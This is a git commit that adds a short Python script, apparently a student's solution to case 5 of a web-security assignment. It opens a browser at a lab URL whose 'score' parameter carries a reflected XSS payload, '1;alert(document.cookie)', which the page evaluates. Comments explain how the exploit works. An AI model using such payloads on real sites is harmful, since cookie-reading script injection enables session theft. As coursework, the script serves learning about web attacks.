5fa21eaa95a54b4f5230b55f4fd603aaa3f6858b
garbanzos <yiyant@gmail.com>
2018-03-18 17:09:26 +0800

    done case 5

---
+++ case05.py
@@ -0,0 +1,12 @@
+import webbrowser
+
+# Exploit: include script in the 'score' - the value of 'score' is placed
+# inside a eval() statement so the script will be executed
+# score = 1;alert(document.cookie)
+# Reflected XSS (without XSS-auditor)
+
+def main():
+    webbrowser.open('http://www.wsb.com/Assignment2/case05.php?score=1%3Balert%28document.cookie%29', 2)
+
+if __name__ == "__main__":
+    main()
